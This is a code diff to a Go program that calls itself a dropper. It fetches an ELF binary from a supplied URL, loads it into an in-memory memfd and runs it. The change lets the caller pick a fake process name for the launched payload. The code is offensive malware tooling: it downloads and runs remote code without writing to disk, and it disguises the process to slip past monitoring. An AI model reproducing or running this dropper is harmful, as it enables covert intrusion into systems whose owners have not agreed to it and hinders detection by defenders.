@@ -51,10 +51,10 @@ func WriteToMemfd(fd int, content []byte) {
 	}
 }
 
-func ExecMemfd(fd int) {
+func ExecMemfd(fd int, procname string) {
 	fmt.Print("[+] Executing Memfd\n")
 	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
-	args := [1]string{filepath}
+	args := [1]string{procname}
 	env := os.Environ()
 	attr := &syscall.ProcAttr{Dir: "/proc/self/fd", Env: env}
 	pid, err := syscall.ForkExec(filepath, args[:], attr)
@@ -67,21 +67,23 @@ func ExecMemfd(fd int) {
 
 func main() {
 	// Define Usage string
-	usage := "Usage : ./dropper {url}\n"
+	usage := "Usage : ./dropper {url} {procname}\n"
 	var url string
+	var procname string
 	var elfContent []byte
 	var fd int
 
 	// Read In URL & Get File
-	if len(os.Args[1:]) != 1 {
+	if len(os.Args[1:]) != 2 {
 		fmt.Printf("Incorrect number of arguements\n%v", usage)
 		unix.Exit(0)
 	}
 	url = os.Args[1]
+	procname = os.Args[2]
 	elfContent = RetrieveFile(url)
 
 	// Create fd and Inject Code
 	fd = MemfdCreate("psovaya")
 	WriteToMemfd(fd, elfContent)
-	ExecMemfd(fd)
+	ExecMemfd(fd, procname)
 }
